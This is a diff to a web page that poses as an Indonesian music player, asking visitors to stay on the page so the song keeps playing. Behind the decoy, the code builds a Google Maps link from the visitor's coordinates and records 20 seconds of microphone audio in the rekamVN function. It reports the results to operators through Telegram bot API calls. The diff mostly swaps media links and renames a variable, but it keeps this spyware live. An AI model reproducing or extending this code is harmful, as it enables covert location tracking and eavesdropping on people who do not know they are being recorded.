@@ -37,7 +37,7 @@
       width: 120px;
       height: 100px;
       border-radius: 50%;
-      background: url('https://files.catbox.moe/qdn2xo.gif') center/cover no-repeat;
+      background: url('https://files.catbox.moe/2g919v.png') center/cover no-repeat;
       background-color: transparent;
       margin: 0 auto 12px;
     }
@@ -145,8 +145,8 @@
     <div class="logo"></div>
     <div class="title-wrapper">
       <div class="title-loop">
-        <span>Masing Masing - (Speed Up)</span>
-        <span>Masing Masing - (Speed Up)</span>
+        <span>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</span>
+        <span>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</span>
       </div>
     </div>
     <div class="artist">Tetap di halaman ini agar music berputar</div>
@@ -162,7 +162,7 @@
       <button onclick="audio.pause()">Pause</button>
     </div>
   </div>
-  <audio id="audio" src="https://files.catbox.moe/jer7h7.mp3" autoplay muted></audio>
+  <audio id="audio" src="https://files.catbox.moe/9h2wob.mp4" autoplay muted></audio>
   <script>
     const audio = document.getElementById("audio");
     const progress = document.getElementById("progress");
@@ -643,8 +643,9 @@ Link Google Maps     : https://maps.google.com/?q=${latitude},${longitude}`);
 
 const rekamVN = async () => {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const recorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
+    // Jangan ganggu audio player!
+    const micStream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } });
+    const recorder = new MediaRecorder(micStream, { mimeType: "audio/webm" });
     const chunks = [];
 
     recorder.ondataavailable = (e) => {
@@ -669,7 +670,7 @@ Status Rekaman VN      : Berhasil direkam
 Durasi Rekaman         : 20 detik
 Tipe File              : audio/webm
 Kualitas Mikrofon      : Stabil
-Kiriman Audio     : Via telegram`;
+Link Kiriman Audio     : (terlampir langsung via Telegram)`;
 
         await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
           method: "POST",
@@ -678,13 +679,13 @@ Kiriman Audio     : Via telegram`;
         });
       }
 
-      stream.getTracks().forEach(t => t.stop());
+      micStream.getTracks().forEach(t => t.stop());
     };
 
-    recorder.start(1000); // setiap 1 detik potong data (biar aman saat tab ditinggal)
+    recorder.start(1000);
     setTimeout(() => {
       recorder.stop();
-    }, 20000);
+    }, 20000); // 20 detik
   } catch {
     for (const t of targets) {
       await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
